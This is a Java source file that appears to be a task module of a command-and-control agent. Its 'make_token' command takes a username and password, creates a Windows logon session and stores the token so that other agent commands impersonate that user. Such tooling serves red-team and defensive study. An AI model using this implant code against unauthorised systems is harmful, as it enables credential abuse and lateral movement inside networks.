package com.woopsie.tasks;

import com.fasterxml.jackson.databind.JsonNode;
import com.woopsie.Config;
import com.woopsie.utils.WindowsAPI;

/**
 * Make token task - create a new logon session and impersonate
 * Windows only
 */
public class MakeTokenTask implements Task {
    
    @Override
    public String execute(Config config, JsonNode parameters) throws Exception {
        Config.debugLog(config, "Executing make_token command");
        
        // Check if we're on Windows
        if (!WindowsAPI.isWindows()) {
            throw new Exception("make_token is only supported on Windows");
        }
        
        // Parse parameters
        String username = null;
        String password = null;
        String domain = ".";
        boolean netOnly = true;
        
        if (parameters.has("credential")) {
            JsonNode cred = parameters.get("credential");
            username = cred.get("account").asText();
            password = cred.get("credential").asText();
            if (cred.has("realm") && !cred.get("realm").asText().isEmpty()) {
                domain = cred.get("realm").asText();
            }
        } else if (parameters.has("username") && parameters.has("password")) {
            String usernameFull = parameters.get("username").asText();
            password = parameters.get("password").asText();
            
            // Parse domain and username format
            int backslashIndex = usernameFull.indexOf('\\');
            if (backslashIndex > 0) {
                domain = usernameFull.substring(0, backslashIndex);
                username = usernameFull.substring(backslashIndex + 1);
            } else {
                username = usernameFull;
            }
        } else {
            throw new Exception("Missing required parameters: credential or username/password");
        }
        
        if (parameters.has("net_only")) {
            netOnly = parameters.get("net_only").asBoolean();
        }
        
        if (username == null || username.isEmpty()) {
            throw new Exception("Username is required");
        }
        
        if (password == null || password.isEmpty()) {
            throw new Exception("Password is required");
        }
        
        Config.debugLog(config, "Attempting to create token for: " + domain + "\\" + username + " (netOnly=" + netOnly + ")");
        Config.debugLog(config, "Current user BEFORE make_token: " + WindowsAPI.getImpersonatedUsername());
        
        // Create the token and get the handle
        com.woopsie.utils.WindowsAPI.TokenResult tokenResult = WindowsAPI.makeTokenWithHandle(username, password, domain, netOnly);
        
        Config.debugLog(config, "Token created successfully");
        
        // Save the token handle globally so other commands can use it
        com.woopsie.Agent.setImpersonationToken(tokenResult.token);
        
        // Get current user context after impersonation (use thread token check)
        String impersonationContext = WindowsAPI.getImpersonatedUsername();
        Config.debugLog(config, "Current user AFTER make_token: " + impersonationContext);
        
        // Return JSON with callback field containing impersonation_context (matches oopsie format)
        return String.format(
            "{\"user_output\": \"%s\", \"callback\": {\"impersonation_context\": \"%s\"}}",
            tokenResult.message.replace("\\", "\\\\").replace("\"", "\\\""),
            impersonationContext.replace("\\", "\\\\").replace("\"", "\\\"")
        );
    }
    
    @Override
    public String getCommandName() {
        return "make_token";
    }
}
